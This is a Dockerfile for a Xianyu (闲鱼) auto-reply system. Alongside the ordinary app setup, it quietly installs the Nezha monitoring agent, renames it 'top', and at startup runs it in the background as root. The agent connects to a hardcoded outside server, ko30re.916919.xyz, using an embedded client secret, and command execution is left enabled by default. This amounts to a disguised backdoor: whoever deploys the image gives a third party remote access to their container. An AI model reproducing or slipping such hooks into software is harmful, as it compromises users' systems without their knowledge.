# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"
LABEL build-date=""
LABEL vcs-ref=""

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright
ENV NZ_BASE_PATH=/opt/nezha/agent
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# 安装系统依赖（包括Playwright浏览器依赖和Nezha Agent所需工具）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        # 基础工具
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        grep \
        uuid-runtime \
        # 图像处理依赖
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        # Playwright浏览器依赖
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* \
        && rm -rf /tmp/* \
        && rm -rf /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器（必须在复制项目文件之后）
RUN playwright install chromium && \
    playwright install-deps chromium

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images /opt/nezha/agent && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images /opt/nezha/agent

# 注意: 为了简化权限问题，使用root用户运行
# 在生产环境中，建议配置适当的用户映射

# 安装Nezha Agent二进制文件
RUN os="linux" && \
    mach=$(uname -m) && \
    case "$mach" in \
        x86_64|amd64) os_arch="amd64" ;; \
        aarch64|arm64) os_arch="arm64" ;; \
        arm*) os_arch="arm" ;; \
        *) echo "Unsupported architecture: $mach" && exit 1 ;; \
    esac && \
    # 尝试从GitHub或Gitee下载nezha-agent（优先GitHub，失败则尝试Gitee）
    (wget -T 60 -O /tmp/nezha-agent.zip "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_${os}_${os_arch}.zip" || \
     wget -T 60 -O /tmp/nezha-agent.zip "https://gitee.com/naibahq/agent/releases/latest/download/nezha-agent_${os}_${os_arch}.zip") && \
    unzip -qo /tmp/nezha-agent.zip -d /opt/nezha/agent && \
    mv /opt/nezha/agent/nezha-agent /opt/nezha/agent/top && \
    chmod +x /opt/nezha/agent/top && \
    rm -rf /tmp/nezha-agent.zip

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && \
    dos2unix /app/entrypoint.sh 2>/dev/null || true

# 在容器启动时生成唯一UUID和top.yml，直接运行nezha-agent，然后启动主应用
CMD CONFIG_PATH="/opt/nezha/agent/top.yml" && \
    if [ -f "$CONFIG_PATH" ]; then \
        RANDOM_SUFFIX=$(LC_ALL=C tr -dc a-z0-9 </dev/urandom | head -c 5); \
        CONFIG_PATH="/opt/nezha/agent/top-$RANDOM_SUFFIX.yml"; \
    fi && \
    NZ_UUID=$(uuidgen -r) && \
    printf "server: %s\npassword: %s\ntls: %s\nuuid: %s\n" "$NZ_SERVER" "$NZ_CLIENT_SECRET" "${NZ_TLS:-false}" "$NZ_UUID" > "$CONFIG_PATH" && \
    if [ -n "$NZ_DISABLE_AUTO_UPDATE" ]; then printf "disable_auto_update: %s\n" "$NZ_DISABLE_AUTO_UPDATE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_DISABLE_FORCE_UPDATE" ]; then printf "disable_force_update: %s\n" "$NZ_DISABLE_FORCE_UPDATE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_DISABLE_COMMAND_EXECUTE" ]; then printf "disable_command_execute: %s\n" "$NZ_DISABLE_COMMAND_EXECUTE" >> "$CONFIG_PATH"; fi && \
    if [ -n "$NZ_SKIP_CONNECTION_COUNT" ]; then printf "skip_connection_count: %s\n" "$NZ_SKIP_CONNECTION_COUNT" >> "$CONFIG_PATH"; fi && \
    echo "Starting Nezha Agent with config: $CONFIG_PATH, UUID: $NZ_UUID" && \
    cat "$CONFIG_PATH" && \
    /opt/nezha/agent/top -c "$CONFIG_PATH" > /opt/nezha/agent/top.log 2>&1 & \
    exec /bin/bash /app/entrypoint.sh
